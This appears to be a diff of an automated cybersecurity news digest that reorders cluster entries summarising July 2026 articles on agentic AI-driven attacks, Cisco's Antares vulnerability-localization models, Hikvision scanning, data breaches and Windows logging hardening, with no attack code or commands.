   - Summary: Written by: Corné de Jong Introduction Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including: Local and Remote File Inclusion (LFI/RFI) Command Injection Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment. Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these pr
 
-### Cluster 9454090822 — score 10
-
-- Title: Four ways AI has fundamentally changed the threat landscape in 2026
-- Source: Sysdig (detection_response_operations)
-- Published: 2026-07-21T00:00:00+00:00
-- Link: https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ransomware_extortion
-- affected_products: Kubernetes
-- cve_ids: CVE-2026-39987
-- urgency_signals: actively_exploited
-- content_type: intel_roundup
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, active_exploitation
-- affected_products: Kubernetes
-- cve_ids: CVE-2026-39987
-- urgency_signals: actively_exploited
-- content_type: intel_roundup
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Sysdig TRT documents four ways agentic AI is reshaping the threat landscape — from autonomous attackers to AI infrastructure as prime target.
-```
-
-#### Full body
-
-```
-< back to blog Four ways AI has fundamentally changed the threat landscape in 2026 Published by: Crystal Morin Sr. Cybersecurity Strategist @ linkedin Published: July 21, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more For years, the threat landscape has held a familiar shape: skilled humans writing malware, scanning for known vulnerabilities, and selling stolen data or access to enterprise environments on dark web forums. That version still exists. It's just no longer the only version defenders have to deal with. I’ve worked with the Sysdig Threat Research Team (TRT) for the last four years. Over that time, attacks have gotten faster — vulnerabilities exploited hours after advisories are published, attacks unfolding in minutes — but recently, we’ve been documenting something structurally different. We’re now seeing not just attackers using AI, but attacks where AI is doing the work, planning, executing, and adapting in real time. O the last six months, four distinct themes have emerged to describe how agentic AI is fundamentally changing the threat landscape. Each of those themes has been seen “in the wild” by the Sysdig TRT; they are not predictions but the culmination of research and field evidence. 1. Enter the agentic threat actor The most significant shift the Sysdig TRT has observed recently is that AI is increasingly conducting the attacks, end to end. We define an agentic threat actor (ATA) as an operator whose attack capability is delivered by an AI agent rather than a human at the keyboard using either a hand-built or AI-developed toolkit. In essence, the AI agent reads environment output, reasons about what to do next in real-time, and executes attack steps continuously without a human making decisions at each step. The difference between an ATA and a human using an AI-developed toolkit, or prompting an LLM as it moves through an environment, is autonomy. A human-in-the-loop model leaves noticeable breaks in the attack timeline where human reasoning exists, and prompt evolution would be evident in the script changes of the agent’s attack. An ATA doesn’t pause. Access to exfiltration in four pivots In May 2026, the Sysdig TRT witnessed an ATA move from initial access through a marimo vulnerability (CVE-2026-39987) to internal database exfiltration in only four pivots in under an hour . Without a human leading the way, the agent extracted credentials, replayed them to retrieve an SSH private key, and used that to drive SSH sessions against a downstream server. Comments leaked into the command stream, and commands built for machine consumption make it obvious that the attack was built by an LLM, for an LLM. What the Sysdig TRT determined after examining this attack was that there was no hesitation between steps, no latency, and artifacts in the payload that no human attacker would ever write into a script. Container escape and Kubernetes secrets In a separate operation, the Sysdig TRT caught an ATA escaping a container and dumping Kubernetes secrets. This was the first time an autonomous attack went beyond the application layer to the orchestration plane — the layer that autonomously controls workload scheduling, secrets, and cluster configuration. Container escape to Kubernetes secrets is the kind of kill chain that isn’t often seen from human attackers because it requires significant expertise to execute. This case demonstrated that an operator can now send an agent to chain the attack together for them, with no prior knowledge necessary. Agentic ransomware Then came JADEPUFFER , the first documented case of agentic ransomware: a complete extortion operation driven end-to-end by an AI agent. The agent found a year-old vulnerability in an internet-facing Langflow instance and enumerated the environment. It specifically scanned for and harves
-```
-
-#### Corroborating sources (1)
-
-- **Sysdig** (detection_response_operations)
-  - Title: Four ways AI has fundamentally changed the threat landscape in 2026
-  - Published: 2026-07-21T00:00:00+00:00
-  - Link: https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
-  - Summary: Sysdig TRT documents four ways agentic AI is reshaping the threat landscape — from autonomous attackers to AI infrastructure as prime target.
-
 ### Cluster 0b91e3a0c2 — score 10
 
 - Title: Anubis ransomware claims Coca-Cola Fairlife attack, threatens data leak
@@ -2891,49 +2839,6 @@ Anubis ransomware claims Coca-Cola Fairlife attack, threatens data leak By Lawre
   - Published: 2026-07-21T18:50:54+00:00
   - Link: https://www.bleepingcomputer.com/news/security/anubis-ransomware-claims-coca-cola-fairlife-attack-threatens-data-leak/
   - Summary: The Anubis ransomware gang has claimed responsibility for the cyberattack on Coca-Cola's Fairlife dairy subsidiary, threatening to publish allegedly stolen corporate data unless the company pays a ransom. [...]
-
-### Cluster e0b8a2bc46 — score 10
-
-- Title: Cisco’s open-weight Antares models make vulnerability localization cheaper
-- Source: Help Net Security (cyber_news_breach_reporting)
-- Published: 2026-07-21T13:01:57+00:00
-- Link: https://www.helpnetsecurity.com/2026/07/21/cisco-antares-vulnerability-localization-released/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: education
-- affected_products: OpenAI/ChatGPT
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- affected_industries: education
-- affected_products: OpenAI/ChatGPT
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-A security analyst opens an unfamiliar repository, pulls up a vulnerability advisory, and starts hunting for the file where the weakness lives. The naming conventions belong to someone else. Evidence sits in scattered corners of a codebase that runs to thousands of files. That first stage of triage burns hours and expertise, and it is the part Cisco set out to speed up. Today, the company released Antares, a family of small language models built … More → The post Cisco’s open-weight Antares models make vulnerability localization cheaper appeared first on Help Net Security .
-```
-
-#### Full body
-
-```
-Mirko Zorz , Director of Content, Help Net Security July 21, 2026 Share Cisco’s open-weight Antares models make vulnerability localization cheaper A security analyst opens an unfamiliar repository, pulls up a vulnerability advisory, and starts hunting for the file where the weakness lives. The naming conventions belong to someone else. Evidence sits in scattered corners of a codebase that runs to thousands of files. That first stage of triage burns hours and expertise, and it is the part Cisco set out to speed up. Today, the company released Antares, a family of small language models built to point analysts at the source files most likely to hold a known vulnerability. Two of them, Antares-350M and Antares-1B, ship as open-weight models on Hugging Face. A larger Antares-3B is coming. Small enough to run in-house Compact models run on local or on-premises hardware, so a team keeps sensitive source code inside its own walls and skips the round trip to a cloud provider. They cost less per job. Cisco aims Antares at universities, public-sector institutions, research institutions, and smaller security teams. Those organizations maintain important software on tight budgets, and token-heavy models have sat out of reach for many of them. The models search the way a person does Each model works a repository the way an investigator would. It starts from a vulnerability description, searches for matching code patterns, reads candidate files, takes in new evidence, backtracks when a path runs dry, and narrows toward the files that matter. The output is a ranked list of source files, paired with the terminal trace that produced it. The approach grew out of earlier Cisco Foundation AI research showing that compact models can learn to search, reflect, revise a strategy, and backtrack. That research pointed to a lesson about scale. Useful retrieval behavior can come from learned search strategies at modest model size. Antares handles one step of a longer chain. The rest of the application security toolchain stays in place, including dependency and software composition analysis, secret scanning, dynamic testing, threat modeling, and expert review. Cisco needed its own benchmark General coding benchmarks measure a different task. They test whether an agent can find code tied to a software issue or a development ticket. Antares works from CWE-style security descriptions and advisories. So Cisco built the Vulnerability Localization Benchmark, a set of 500 entries that ask a model to navigate an unfamiliar codebase and spot patterns linked to specific CWE categories. The closest prior work is CodeScout, which evaluates terminal-based code-search agents on suites like SWE-Bench Verified and showed that code localization can be measured with a standard Unix terminal. Where the scores land On the benchmark’s F1 score, the Antares models rank near the top of a field of much larger systems. Antares-3B, the model still to come, scores among the leaders, close to the strongest GPT-5.5 configurations. Antares-1B beats GLM-5.2 and Gemini 3 Pro at a small fraction of their size. What it costs to run On the benchmark, the Antares models run at a small fraction of the cost of the larger systems Cisco tested. The spread is wide at the top of the field. On the vulnerability localization benchmark, the Antares model family completes runs at substantially lower estimated cost and runtime than larger comparison models (Source: Cisco) GPT-5.5 , the strongest closed model in the comparison, costs about $141 per evaluation. The Antares family does the same job for roughly 172x cheaper. The best open-weight model in the set, GLM-5.2, costs about $12.50 per evaluation. Against that, Antares runs about 15.2x cheaper. Runtime moves the same way, with the Antares models finishing quickly and the largest closed model needing several hours. The cost gap caught attention outside Cisco. Amin Saberi , a professor of management science and engineering at Stanford University, ti
-```
-
-#### Corroborating sources (1)
-
-- **Help Net Security** (cyber_news_breach_reporting)
-  - Title: Cisco’s open-weight Antares models make vulnerability localization cheaper
-  - Published: 2026-07-21T13:01:57+00:00
-  - Link: https://www.helpnetsecurity.com/2026/07/21/cisco-antares-vulnerability-localization-released/
-  - Summary: A security analyst opens an unfamiliar repository, pulls up a vulnerability advisory, and starts hunting for the file where the weakness lives. The naming conventions belong to someone else. Evidence sits in scattered corners of a codebase that runs to thousands of files. That first stage of triage burns hours and expertise, and it is the part Cisco set out to speed up. Today, the company released Antares, a family of small language models built … More → The post Cisco’s open-weight Antares models make vulnerability localization cheaper appeared first on Help Net Security .
 
 ### Cluster 2de7ac9412 — score 10
 
@@ -3115,6 +3020,39 @@ Developers & Practitioners Generosity Under Conditions: Hardening Google Cloud A
   - Link: https://www.darkreading.com/cloud-security/google-bets-agentic-defense-strategy-outpace-attackers
   - Summary: Google Cloud incorporates key Wiz capabilities into an agentic defense platform to automate threat detection and remediation against AI attacks.
 
+### Cluster c715bd520f — score 9
+
+- Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
+- Source: SANS Internet Storm Center (government_authoritative)
+- Published: 2026-07-19T15:00:38+00:00
+- Link: https://isc.sans.edu/diary/rss/33164
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Summary
+
+```
+We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.
+```
+
+#### Corroborating sources (1)
+
+- **SANS Internet Storm Center** (government_authoritative)
+  - Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
+  - Published: 2026-07-19T15:00:38+00:00
+  - Link: https://isc.sans.edu/diary/rss/33164
+  - Summary: We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.
+
 ### Cluster ab13f77dd3 — score 9
 
 - Title: Helping small businesses with free, hands-on cyber consultancy
@@ -3157,72 +3095,6 @@ Blog Post Download & print article PDF Download & print article PDF Helping smal
   - Published: 2026-07-15T12:00:00+00:00
   - Link: https://www.ncsc.gov.uk/blogs/helping-small-businesses-with-free-hands-on-cyber-consultancy
   - Summary: Cyber Advisors are offering free 30-minute consultations to help small businesses get started with cyber security.
-
-### Cluster c715bd520f — score 9
-
-- Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
-- Source: SANS Internet Storm Center (government_authoritative)
-- Published: 2026-07-19T15:00:38+00:00
-- Link: https://isc.sans.edu/diary/rss/33164
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Summary
-
-```
-We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.
-```
-
-#### Corroborating sources (1)
-
-- **SANS Internet Storm Center** (government_authoritative)
-  - Title: Scans for Hikvision Intelligent Security API, (Sun, Jul 19th)
-  - Published: 2026-07-19T15:00:38+00:00
-  - Link: https://isc.sans.edu/diary/rss/33164
-  - Summary: We have been following issues with Hikvision cameras for a long, long time . Like many similar products, Hikvision cameras have a long history of vulnerabilities and are often targeted by internet-wide scans that our honeypot network detects.
-
-### Cluster 4d8bcc6f12 — score 9
-
-- Title: Recent DShield SIEM Update, (Tue, Jul 14th)
-- Source: SANS Internet Storm Center (government_authoritative)
-- Published: 2026-07-15T01:38:43+00:00
-- Link: https://isc.sans.edu/diary/rss/33156
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Summary
-
-```
-The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some minor tweaks. This update currently is using ELK stack version 8.19.15, contains some additional dashboards and new logs.
-```
-
-#### Corroborating sources (1)
-
-- **SANS Internet Storm Center** (government_authoritative)
-  - Title: Recent DShield SIEM Update, (Tue, Jul 14th)
-  - Published: 2026-07-15T01:38:43+00:00
-  - Link: https://isc.sans.edu/diary/rss/33156
-  - Summary: The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some minor tweaks. This update currently is using ELK stack version 8.19.15, contains some additional dashboards and new logs.
 
 ### Cluster 86bb601c47 — score 9
 
@@ -3269,48 +3141,52 @@ Blog The New Hotness in Phishing: Device Code Attacks in M365 July 21, 2026 The 
   - Link: https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365
   - Summary: <p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>
 
-### Cluster 823e314fa6 — score 9
+### Cluster 9454090822 — score 9
 
-- Title: 300 WINtegrations Strong: An Open Security Ecosystem Built for the Speed of AI
-- Source: Wiz Research (cloud_identity_infrastructure)
-- Published: 2026-07-21T12:35:58+00:00
-- Link: https://www.wiz.io/blog/wiz-integration-network-reaches-300
+- Title: Four ways AI has fundamentally changed the threat landscape in 2026
+- Source: Sysdig (detection_response_operations)
+- Published: 2026-07-21T00:00:00+00:00
+- Link: https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- urgency_signals: zero_day
-- content_type: news_report
+- threat_categories: active_exploitation, ransomware_extortion
+- affected_products: Kubernetes
+- cve_ids: CVE-2026-39987
+- urgency_signals: actively_exploited
+- content_type: intel_roundup
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: zero_day
-- urgency_signals: zero_day
-- content_type: news_report
+- threat_categories: ransomware_extortion, active_exploitation
+- affected_products: Kubernetes
+- cve_ids: CVE-2026-39987
+- urgency_signals: actively_exploited
+- content_type: intel_roundup
 - confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-As AI accelerates how organizations build and how attackers operate, a deeply connected security ecosystem is how defenders keep up.
+Sysdig TRT documents four ways agentic AI is reshaping the threat landscape — from autonomous attackers to AI infrastructure as prime target.
 ```
 
 #### Full body
 
 ```
-Wiz Pricing Get a demo Get a demo AI is rewriting the rules: for builders and security teams. Organizations are shipping AI-generated code and scaling faster than ever, demanding security that moves at the exact same speed. To protect at this pace, security must be embedded everywhere teams build, which requires an open, deeply connected ecosystem that moves as fast as the organization. That’s exactly what the Wiz Integration Network was created for 3 years ago. And today we’re proud to announce a major milestone: 300 partner integrations, a powerful testament to securing the AI era, together. What 300 Integrations Means in an AI World This milestone isn't just growth, it's reach. WIN at 300 spans developer toolchains, CI/CD pipelines, API endpoints, threat intel, SaaS platforms, and the collaboration tools teams live in every day. That reach matters because AI has expanded where security needs to show up. Code ships faster. AI models become production assets with their own supply chains. Infrastructure scales on demand. Organizations are moving at a pace that didn't exist two years ago, and their security ecosystem needs to keep up. At Amplitude , this is already the reality. By plugging Wiz directly into their developer tools, security travels with the team instead of slowing it down. As Shawn Verilli, a former Senior Staff Security Engineer at Amplitude, put it: "I can't stress how valuable it is that I can plug Wiz CLI into our code or GitHub during a build to ensure we're secure. That integration really helps push our shift left strategy because our developers have information where they work." When hundreds of integrations feed into the Wiz Security Graph simultaneously, you stop getting isolated alerts. A vulnerability in code connects to the workload it runs on, the team that owns it, the ticket that tracks it, and the runtime context that tells you if it's exploitable right now. Every integration makes every other integration more valuable. Roy Weiss, Principal DevSecOps Expert at Fireblocks, explains: "Before, we were missing visibility into which endpoints were actually behind Cloudflare. Now, with the dynamic scanner and Red Agent, it’s doing much better. The correlated findings and tuning are stronger because I get immediate feedback. I know exactly what’s exposed and what isn’t. It gives us the full coverage we were missing. And on top of that, if there's a zero-day or a vulnerability the industry needs to know about, we'll identify it in a second through the Threat Intel Center.” That compounding effect is what turns a platform into an operating model, one that moves at the speed organizations need and that AI threats demand. And we're not just growing the ecosystem — we're making it faster to build on. With the WIN MCP, we're bringing WIN documentation and integration context directly to the developer workstation, so partners can build and ship integrations at the same AI speed our customers need to secure at. The program itself is evolving to match the moment. An Open Security Ecosystem Accelerates Response From 100 to 200 to 300 integrations, it’s held true that shared context drives action. We’re seeing that impact in how teams actually operate. Starting with our first WIN Partner Index we released earlier this year, our annual benchmark analyzing real integration usage across the ecosystem. The data showed security is moving into the tools where work happens, embedding across the full development lifecycle, and growing fastest where it tackles complex cloud challenges. And when integrations connect across the stack, teams can validate that their existing investments are actually delivering. At UiPath , that's exactly what happened. "Using Wiz and Echo together really helps us validate the value we get out of Echo," says Dan Rediske, Senior Engineering Manager. "Wiz allows us to measure the CVEs across our platform, including those that aren't from Echo, and the Echo images measure up." Where We're Headed To
+< back to blog Four ways AI has fundamentally changed the threat landscape in 2026 Published by: Crystal Morin Sr. Cybersecurity Strategist @ linkedin Published: July 21, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more For years, the threat landscape has held a familiar shape: skilled humans writing malware, scanning for known vulnerabilities, and selling stolen data or access to enterprise environments on dark web forums. That version still exists. It's just no longer the only version defenders have to deal with. I’ve worked with the Sysdig Threat Research Team (TRT) for the last four years. Over that time, attacks have gotten faster — vulnerabilities exploited hours after advisories are published, attacks unfolding in minutes — but recently, we’ve been documenting something structurally different. We’re now seeing not just attackers using AI, but attacks where AI is doing the work, planning, executing, and adapting in real time. O the last six months, four distinct themes have emerged to describe how agentic AI is fundamentally changing the threat landscape. Each of those themes has been seen “in the wild” by the Sysdig TRT; they are not predictions but the culmination of research and field evidence. 1. Enter the agentic threat actor The most significant shift the Sysdig TRT has observed recently is that AI is increasingly conducting the attacks, end to end. We define an agentic threat actor (ATA) as an operator whose attack capability is delivered by an AI agent rather than a human at the keyboard using either a hand-built or AI-developed toolkit. In essence, the AI agent reads environment output, reasons about what to do next in real-time, and executes attack steps continuously without a human making decisions at each step. The difference between an ATA and a human using an AI-developed toolkit, or prompting an LLM as it moves through an environment, is autonomy. A human-in-the-loop model leaves noticeable breaks in the attack timeline where human reasoning exists, and prompt evolution would be evident in the script changes of the agent’s attack. An ATA doesn’t pause. Access to exfiltration in four pivots In May 2026, the Sysdig TRT witnessed an ATA move from initial access through a marimo vulnerability (CVE-2026-39987) to internal database exfiltration in only four pivots in under an hour . Without a human leading the way, the agent extracted credentials, replayed them to retrieve an SSH private key, and used that to drive SSH sessions against a downstream server. Comments leaked into the command stream, and commands built for machine consumption make it obvious that the attack was built by an LLM, for an LLM. What the Sysdig TRT determined after examining this attack was that there was no hesitation between steps, no latency, and artifacts in the payload that no human attacker would ever write into a script. Container escape and Kubernetes secrets In a separate operation, the Sysdig TRT caught an ATA escaping a container and dumping Kubernetes secrets. This was the first time an autonomous attack went beyond the application layer to the orchestration plane — the layer that autonomously controls workload scheduling, secrets, and cluster configuration. Container escape to Kubernetes secrets is the kind of kill chain that isn’t often seen from human attackers because it requires significant expertise to execute. This case demonstrated that an operator can now send an agent to chain the attack together for them, with no prior knowledge necessary. Agentic ransomware Then came JADEPUFFER , the first documented case of agentic ransomware: a complete extortion operation driven end-to-end by an AI agent. The agent found a year-old vulnerability in an internet-facing Langflow instance and enumerated the environment. It specifically scanned for and harves
 ```
 
 #### Corroborating sources (1)
 
-- **Wiz Research** (cloud_identity_infrastructure)
-  - Title: 300 WINtegrations Strong: An Open Security Ecosystem Built for the Speed of AI
-  - Published: 2026-07-21T12:35:58+00:00
-  - Link: https://www.wiz.io/blog/wiz-integration-network-reaches-300
-  - Summary: As AI accelerates how organizations build and how attackers operate, a deeply connected security ecosystem is how defenders keep up.
+- **Sysdig** (detection_response_operations)
+  - Title: Four ways AI has fundamentally changed the threat landscape in 2026
+  - Published: 2026-07-21T00:00:00+00:00
+  - Link: https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
+  - Summary: Sysdig TRT documents four ways agentic AI is reshaping the threat landscape — from autonomous attackers to AI infrastructure as prime target.
 
 ### Cluster c67b78a2cc — score 9
 
@@ -3504,6 +3380,49 @@ Healthcare technology company Clover Health Investments has disclosed a data bre
   - Link: https://www.securityweek.com/clover-health-investments-discloses-data-breach/
   - Summary: Using social engineering, hackers compromised employee accounts with access to personal and health information. The post Clover Health Investments Discloses Data Breach appeared first on SecurityWeek .
 
+### Cluster e0b8a2bc46 — score 9
+
+- Title: Cisco’s open-weight Antares models make vulnerability localization cheaper
+- Source: Help Net Security (cyber_news_breach_reporting)
+- Published: 2026-07-21T13:01:57+00:00
+- Link: https://www.helpnetsecurity.com/2026/07/21/cisco-antares-vulnerability-localization-released/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_industries: education
+- affected_products: OpenAI/ChatGPT
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- affected_industries: education
+- affected_products: OpenAI/ChatGPT
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+A security analyst opens an unfamiliar repository, pulls up a vulnerability advisory, and starts hunting for the file where the weakness lives. The naming conventions belong to someone else. Evidence sits in scattered corners of a codebase that runs to thousands of files. That first stage of triage burns hours and expertise, and it is the part Cisco set out to speed up. Today, the company released Antares, a family of small language models built … More → The post Cisco’s open-weight Antares models make vulnerability localization cheaper appeared first on Help Net Security .
+```
+
+#### Full body
+
+```
+Mirko Zorz , Director of Content, Help Net Security July 21, 2026 Share Cisco’s open-weight Antares models make vulnerability localization cheaper A security analyst opens an unfamiliar repository, pulls up a vulnerability advisory, and starts hunting for the file where the weakness lives. The naming conventions belong to someone else. Evidence sits in scattered corners of a codebase that runs to thousands of files. That first stage of triage burns hours and expertise, and it is the part Cisco set out to speed up. Today, the company released Antares, a family of small language models built to point analysts at the source files most likely to hold a known vulnerability. Two of them, Antares-350M and Antares-1B, ship as open-weight models on Hugging Face. A larger Antares-3B is coming. Small enough to run in-house Compact models run on local or on-premises hardware, so a team keeps sensitive source code inside its own walls and skips the round trip to a cloud provider. They cost less per job. Cisco aims Antares at universities, public-sector institutions, research institutions, and smaller security teams. Those organizations maintain important software on tight budgets, and token-heavy models have sat out of reach for many of them. The models search the way a person does Each model works a repository the way an investigator would. It starts from a vulnerability description, searches for matching code patterns, reads candidate files, takes in new evidence, backtracks when a path runs dry, and narrows toward the files that matter. The output is a ranked list of source files, paired with the terminal trace that produced it. The approach grew out of earlier Cisco Foundation AI research showing that compact models can learn to search, reflect, revise a strategy, and backtrack. That research pointed to a lesson about scale. Useful retrieval behavior can come from learned search strategies at modest model size. Antares handles one step of a longer chain. The rest of the application security toolchain stays in place, including dependency and software composition analysis, secret scanning, dynamic testing, threat modeling, and expert review. Cisco needed its own benchmark General coding benchmarks measure a different task. They test whether an agent can find code tied to a software issue or a development ticket. Antares works from CWE-style security descriptions and advisories. So Cisco built the Vulnerability Localization Benchmark, a set of 500 entries that ask a model to navigate an unfamiliar codebase and spot patterns linked to specific CWE categories. The closest prior work is CodeScout, which evaluates terminal-based code-search agents on suites like SWE-Bench Verified and showed that code localization can be measured with a standard Unix terminal. Where the scores land On the benchmark’s F1 score, the Antares models rank near the top of a field of much larger systems. Antares-3B, the model still to come, scores among the leaders, close to the strongest GPT-5.5 configurations. Antares-1B beats GLM-5.2 and Gemini 3 Pro at a small fraction of their size. What it costs to run On the benchmark, the Antares models run at a small fraction of the cost of the larger systems Cisco tested. The spread is wide at the top of the field. On the vulnerability localization benchmark, the Antares model family completes runs at substantially lower estimated cost and runtime than larger comparison models (Source: Cisco) GPT-5.5 , the strongest closed model in the comparison, costs about $141 per evaluation. The Antares family does the same job for roughly 172x cheaper. The best open-weight model in the set, GLM-5.2, costs about $12.50 per evaluation. Against that, Antares runs about 15.2x cheaper. Runtime moves the same way, with the Antares models finishing quickly and the largest closed model needing several hours. The cost gap caught attention outside Cisco. Amin Saberi , a professor of management science and engineering at Stanford University, ti
+```
+
+#### Corroborating sources (1)
+
+- **Help Net Security** (cyber_news_breach_reporting)
+  - Title: Cisco’s open-weight Antares models make vulnerability localization cheaper
+  - Published: 2026-07-21T13:01:57+00:00
+  - Link: https://www.helpnetsecurity.com/2026/07/21/cisco-antares-vulnerability-localization-released/
+  - Summary: A security analyst opens an unfamiliar repository, pulls up a vulnerability advisory, and starts hunting for the file where the weakness lives. The naming conventions belong to someone else. Evidence sits in scattered corners of a codebase that runs to thousands of files. That first stage of triage burns hours and expertise, and it is the part Cisco set out to speed up. Today, the company released Antares, a family of small language models built … More → The post Cisco’s open-weight Antares models make vulnerability localization cheaper appeared first on Help Net Security .
+
 ### Cluster 379b389c21 — score 9
 
 - Title: Estée Lauder discloses data breach tied to Oracle EBS vulnerability
@@ -3553,102 +3472,26 @@ Sinisa Markovic , Managing Editor, Help Net Security July 21, 2026 Share Estée 
   - Link: https://www.helpnetsecurity.com/2026/07/21/estee-lauder-data-breach-oracle-ebs/
   - Summary: Cosmetics company Estée Lauder disclosed a data breach tied to a vulnerability in Oracle E-Business Suite (EBS) used for the company’s human resources operations. Estée Lauder is one of the largest beauty companies in the world, known for its prestige skincare, makeup, fragrance, and haircare brands. “We became aware of a cybersecurity issue involving a vulnerability in the Oracle E-Business Suite system which is used by the Estee Lauder Companies for HR management purposes,” the … More → The post Estée Lauder discloses data breach tied to Oracle EBS vulnerability appeared first on Help Net Security .
 
-### Cluster 0c564d4f92 — score 9
-
-- Title: Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging
-- Source: Team Cymru (ransomware_ecrime_financial_crime)
-- Published: 2026-07-21T13:55:45+00:00
-- Link: https://www.team-cymru.com/post/modernizing-incident-response-4-steps-to-bulletproof-your-windows-logging
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Improve your cyber incident response steps with our guide to bulletproof Windows logging. Discover incident response tools and how AI streamlines DFIR.
-```
-
-#### Full body
-
-```
-All Blog Internet Weather Threat Research Threat Intelligence 101 Abigail Lorion 2 min read July 14, 2026 Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging In the latest episode of the Future of Threat Intelligence podcast, host Eli Woodward is joined by Andrew Rathbun, Senior Consultant at Palo Alto Networks’ Unit 42, to analyze the hidden liabilities within default enterprise logging architectures. For investigators tracking sophisticated network intrusions, native operating system settings frequently serve as an unintentional bottleneck to successful timeline reconstruction. Andrew’s deep knowledge of Windows logging, combined with his passion for incident response, provides a rare and deep view into Windows logging few in the industry can match. These insights are obtained and developed through years of practical IR knowledge and seeing what works and what does not. ‍ Windows systems routinely process security telemetry through what Rathbun identifies as a "conveyor belt of volatility". Every second, Rathbun notes, logs are deleted to make space for new entries. This is largely a relic of 2002 disk size constraints and remains a default in Windows systems – critical security event logs continuously overwrite themselves to accommodate live network data. High-consequence forensic primitives including Event ID 4624 successful authentications and Event ID 4625 authentication failures rapidly cycle off the back end of the server. When a digital forensics firm arrives to investigate an active breach, the historical logging record required to spot brute-force indicators has often vanished entirely. ‍ Four Tactic Framework to Expand Retention ‍ Countering this automated data loss requires system administrators to aggressively harden the native operating system environment before an attack occurs. Responders cannot protect an infrastructure if the evidence of initial access is unrecoverable. Here is the breakdown of Rathbun’s specific recommendations: - Increase the Default Log Size : Substantially increase the Security log from its default 32 MB up to 1 GB. This expands the "bucket" to hold months of data, which is highly feasible and low-cost given modern storage availability. - Install and Update Sysmon : Deploy Sysmon to log detailed process activity, capturing threat actor tactics like time-stomping and process hollowing. While scheduled for inclusion in Windows 11 updates, it still requires manual updates; sysadmins must actively maintain it to avoid missing new capabilities or bug fixes. - Enable Volume Shadow Copies : Maintain these copies as an essential defense to mitigate log-clearing attempts and provide forensic investigators with a historical view of file system artifacts. - Ensure the USN Journal ($J) Exists and is Sized Correctly : Verify the existence of the USN Journal to act as a file system ledger that records all file creations, deletions, renames, and size changes. Ensure it is sized sufficiently large to prevent critical forensic data from being overwritten too quickly. ‍ Deploying Al as a Scripting Engine ‍ Within modern Digital Forensics and Incident Response (DFIR) workflows, artificial intelligence serves 